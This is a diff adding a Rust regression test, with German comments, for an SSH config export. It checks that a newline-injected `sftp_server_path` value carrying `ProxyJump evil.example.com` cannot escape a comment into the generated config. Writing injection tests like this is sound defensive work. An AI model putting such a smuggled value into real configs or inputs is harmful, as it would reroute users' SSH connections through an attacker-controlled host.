@@ -405,6 +405,23 @@ fn t_review1_schlagwort_mit_newline_bricht_nicht_aus_dem_kommentar_aus() {
     );
 }
 
+/// spec-reviewer-Fund, Runde 2 (Fall 4 der Adversarial-Tabelle): dieselbe
+/// dritte Kommentar-Senke — `sftp_server_path` — war im Code schon
+/// saniert, aber ungeprüft.
+#[test]
+fn t_review2_sftp_server_path_mit_newline_bricht_nicht_aus_dem_kommentar_aus() {
+    let mut s = server("web1", "10.0.0.1", 22, "");
+    s.sftp_server_path = Some("/usr/lib/sftp\nProxyJump evil.example.com\n#".to_string());
+
+    let plan = build_export(&[s], &[], LOCAL);
+
+    assert!(
+        !plan.text.contains("\nProxyJump evil.example.com\n"),
+        "der sftp_server_path brach aus dem Kommentar aus:\n{}",
+        plan.text
+    );
+}
+
 /// §1.3: das Anlegen von Hand kennt keinen Pflichtfeld-Check — ein leerer
 /// `host` ist erreichbar. `HostName ""` ist gegenüber echtem `ssh`
 /// fragwürdig; die Zeile bleibt deshalb ganz weg (§3.2.1 setzt implizit
